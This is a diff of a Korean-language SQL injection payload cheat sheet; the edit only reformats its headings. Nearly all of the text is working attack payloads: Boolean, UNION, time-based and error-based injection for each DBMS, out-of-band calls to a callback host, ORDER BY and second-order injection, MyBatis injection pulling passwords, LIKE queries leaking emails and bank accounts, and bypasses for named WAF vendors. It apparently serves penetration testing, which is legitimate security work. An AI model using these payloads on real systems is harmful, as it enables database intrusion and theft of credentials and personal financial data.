@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**Classic SQLi (Boolean / UNION):**
+#### Classic SQLi (Boolean / UNION)
 - `' OR '1'='1` — Boolean (query/body)
 - `' OR '1'='1' --` — 주석으로 나머지 무효화
 - `' OR 1=1#` — `#` 주석 (MySQL)
@@ -9,7 +9,7 @@
 - `1 UNION SELECT NULL,version(),NULL --` — 데이터 추출
 - `' AND 1=1 --` vs `' AND 1=2 --` — Boolean diff
 
-**Blind SQLi — Time-based (DBMS별):**
+#### Blind SQLi — Time-based (DBMS별)
 
 | DBMS | 페이로드 |
 |---|---|
@@ -19,7 +19,7 @@
 | Oracle | `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)=1--` |
 | SQLite | `' AND randomblob(100000000) IS NULL--` (CPU bound) |
 
-**Error-based (정보 추출):**
+#### Error-based (정보 추출)
 
 | DBMS | 페이로드 |
 |---|---|
@@ -28,7 +28,7 @@
 | MSSQL | `' AND 1=convert(int,@@version)--` |
 | Oracle | `' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--` |
 
-**OOB (Out-of-band):**
+#### OOB (Out-of-band)
 
 | DBMS | 페이로드 |
 |---|---|
@@ -37,23 +37,23 @@
 | MSSQL | `'; EXEC master..xp_dirtree '\\\\CALLBACK\\share'--` |
 | Oracle | `' AND UTL_HTTP.request('https://CALLBACK/x') IS NOT NULL--`, `UTL_INADDR.get_host_name('CALLBACK')` |
 
-**ORDER BY / LIMIT / 식별자 위치:**
+#### ORDER BY / LIMIT / 식별자 위치
 - `(CASE WHEN 1=1 THEN id ELSE name END)` — Boolean 정렬 차이
 - `(SELECT 1 FROM (SELECT SLEEP(3))a)` — Time MySQL ORDER BY 서브쿼리
 - `1, IF(1=1,SLEEP(3),0)` — MySQL 다중 컬럼
 - `1; WAITFOR DELAY '0:0:3'--` — MSSQL stacked
 - `1 PROCEDURE ANALYSE(EXTRACTVALUE(...,...))` — MySQL 5.x 에러 추출
 
-**LIKE 와일드카드 데이터 릭:**
+#### LIKE 와일드카드 데이터 릭
 - `?filter[email]=%@naver.com` (query) — 도메인별 사용자 식별
 - `?filter[bank_account]=%` — 전체 계좌
 - `?q=admin%` — prefix 매칭
 
-**2차 SQLi:**
+#### 2차 SQLi
 - 1차: 닉네임/프로필에 `a' OR SLEEP(3)-- a` 저장
 - 2차: 관리자 조회 등 raw query로 재사용 endpoint 호출 → 지연/에러 관찰
 
-**MyBatis `${}` 환경 (Java/Kotlin):**
+#### MyBatis `${}` 환경 (Java/Kotlin)
 - 정렬 파라미터: `?sort=id) UNION SELECT password FROM users--`
 - IN 절: `?ids=1) OR 1=1--`
 
@@ -78,13 +78,13 @@
 | WAF 정규식 (`SELECT FROM`) | `SELECT/*x*/FROM`, `SELECT(*)FROM`, `SELECT''FROM` |
 | Stacked query 드라이버 차단 | trigger/view 정의로 후속 실행 |
 
-**컨텍스트 변형:**
+#### 컨텍스트 변형
 - JSON body: `{"id":"1' OR '1'='1"}`
 - multipart: form-data field에 페이로드
 - Header (User-Agent/Referer 로깅 sink): `User-Agent: ' OR SLEEP(3)--`
 - Cookie sink: `Cookie: track_id=' OR 1=1--`
 
-**WAF 벤더별:**
+#### WAF 벤더별
 - Cloudflare: `/*!50000SELECT*/`, double URL encoding, `/*//*/UNION/*//*/SELECT`
 - AWS WAF: `''=''`, `1.0=1`, JSON inline 변형
 - ModSecurity OWASP CRS: `1'/**/AND/**/1=1--`, paranoia level 의존
